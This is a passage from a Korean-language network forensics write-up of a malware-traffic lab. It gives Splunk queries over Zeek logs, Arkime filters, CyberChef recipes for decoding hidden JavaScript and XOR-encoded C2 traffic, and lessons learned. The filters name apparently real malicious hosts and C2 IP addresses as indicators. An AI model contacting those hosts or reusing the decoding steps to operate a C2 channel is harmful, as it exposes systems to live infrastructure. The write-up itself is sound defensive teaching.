index=zeek pcap_case=<case> | stats count by sourcetype | sort - count
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats min(ts) as first max(ts) as last count as sessions | eval duration_min=round((last-first)/60,1) | eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
index=zeek sourcetype=zeek:conn pcap_case=<case> | stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h | eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S") | sort - sessions
index=zeek sourcetype=zeek:kerberos pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client | sort first
index=zeek sourcetype=zeek:ntlm pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success
index=zeek sourcetype=zeek:dns pcap_case=<case> qtype_name=SOA | eval t=strftime(ts,"%H:%M:%S") | table t id_orig_h id_resp_h query qtype_name rcode_name
index=zeek sourcetype=zeek:software pcap_case=<case> | eval t=strftime(ts,"%H:%M:%S") | table t host software_type name unparsed_version
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4 | stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p | sort - count
index=zeek sourcetype=zeek:dns pcap_case=<case> id_orig_h=<pc> NOT query="*<own domain>" | rex field=query "(?<domain>[^.]+\.[^.]+)$" | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first count dc(query) as names values(query) as examples by domain | eval examples=mvindex(examples,0,2) | sort first
index=zeek sourcetype=zeek:conn pcap_case=<case> id_orig_h=<pc> NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4 NOT [search index=zeek sourcetype=zeek:dns pcap_case=<case> | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h] | eval t=strftime(ts,"%H:%M:%S") | stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> | eval host=mvdedup(host) | eval t=strftime(ts,"%H:%M:%S") | stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host | sort first
index=zeek sourcetype=zeek:http pcap_case=<case> host IN ("<h1>","<h2>") | eval t=strftime(ts,"%H:%M:%S.%3N") | search NOT uri="*.jpg*" NOT uri="*.png*" NOT uri="*.gif*" NOT uri="*.css*" | sort ts | table t host uri referrer status_code resp_mime_types response_body_len
index=zeek sourcetype=zeek:ssl pcap_case=<case> server_name="*<name>*" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t id_resp_h id_resp_p server_name version established
index=zeek sourcetype=zeek:http pcap_case=<case> host="<c2 host>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t uid id_orig_p id_resp_h method uri status_code user_agent request_body_len response_body_len resp_mime_types
index=zeek sourcetype=zeek:files pcap_case=<case> tx_hosts="<server ip>" | eval t=strftime(ts,"%H:%M:%S.%3N") | table t tx_hosts rx_hosts mime_type seen_bytes md5
index=zeek sourcetype=zeek:conn pcap_case=<case> id_resp_h IN ("<ip1>","<ip2>") | sort ts | delta ts as gap | eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1) | table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
| makeresults | eval t=strftime(<epoch_ms>/1000, "%Y-%m-%d %H:%M:%S.%3N") | table t
```

**Arkime**

```text
tags == <case>
tags == <case> && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
tags == <case> && host.http == bb17eb22.login3.kimbrelelectric.com
tags == <case> && ip.dst == [46.105.131.66, 107.170.231.118]
```

**CyberChef**

```text
숨긴 JS 문자열:  Find / Replace (Regex (.)(.) -> $2, Global)  ->  Reverse (Character)      [따옴표 없이 입력]
C2 POST 본문:    From Hex  ->  XOR Brute Force (Key length 1, Crib &1=)  ->  XOR (Key <hex>)  ->  URL Decode
epoch 밀리초:    From UNIX Timestamp (Units: Milliseconds)
```

---

## 배운 점 { #lessons }

1. **베이스라이닝 메모는 나중에 빛나요.** 설명 안 되던 세 줄(조용한 IP 두 곳, 이상한 User-Agent 하나)이 감염 전체였어요. 각각은 나중에 새 사실이 나와서야 설명됐어요.
2. **바쁜 브라우징은 짧은 공격을 숨겨요.** 목적지 184곳 중 감염은 1분 동안의 몇 곳이에요. 아는 정상(CDN, 광고, BITS, CryptoAPI, 광고 플랫폼 CNAME)을 지우고 남은 것을 읽어요.
3. **DNS 없음 + 일정한 박자 = 프로그램.** DNS 없는 목적지 서브서치가 184곳을 C2 IP 두 곳으로 줄였어요.
4. **Referer가 곧 사슬이에요.** 악성 요청은 모두 교회 페이지를 가리켰어요.
5. **새 User-Agent = 새 프로그램.** 다운로드 46초 뒤 `MSIE 7.0` + `UA-CPU`는 파일이 실행됐다는 신호였고, `b=`가 증명했어요.
6. **누가/언제/얼마나는 Splunk, 정확히 무엇은 Arkime.** 다운로드 URL과 프로필 정보는 본문에만 있었어요.
7. **해독기는 숨긴 글자와 같이 다녀요.** 함수를 읽고 옮기거나, 오프라인 콘솔에서 함수만 실행해요. 해독기가 없으면 모양을 읽어요: 글자 종류 → 겹 → 형식에서 고른 crib.
8. **레시피를 탓하기 전에 입력을 확인해요.** 따옴표, 빠진 앞부분, 잘린 줄 접기가 결과를 다 바꿨어요. `ABC`와 Zeek의 본문 길이로 잡아요.
9. **도구의 한계를 알아요.** 값이 두 개인 `host`가 숫자를 두 배로, Arkime의 200패킷 제한이 `c=`를 숨겼고, 재색인은 모든 걸 두 배로 만들 뻔했어요.
10. **데이터와 추측을 구별해요.** "시간이 맞는다"는 추측, "풀어 낸 코드에 그렇게 있다"는 증거예요. 보고서에는 증거를 써요.

## 참고 자료 { #references }

- [Night Dew 두 번째 분석 — pcapbox, Snort 테스트 가이드](night-dew-arkime-splunk-netlogon-bruteforce.md) · [BEGUILESOFT — Splunk 중심 베이스라이닝](beguilesoft-hawkeye-ftp-exfil.md)
- [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md)
- [Zeek 로그](../../network/zeek/index.md) · [conn.log](../../network/zeek/conn-log.md) · [files.log](../../network/zeek/files-log.md) · [ssl & x509](../../network/zeek/ssl-x509.md)
- [비콘과 C2](../../network/beaconing-c2.md) · [플레이북: 침해된 워크스테이션](../playbooks/compromised-workstation.md)
- 원래 실습: [malware-traffic-analysis.net — 2018-06-30 Sorting through the alerts](https://malware-traffic-analysis.net/2018/06/30/index.html)
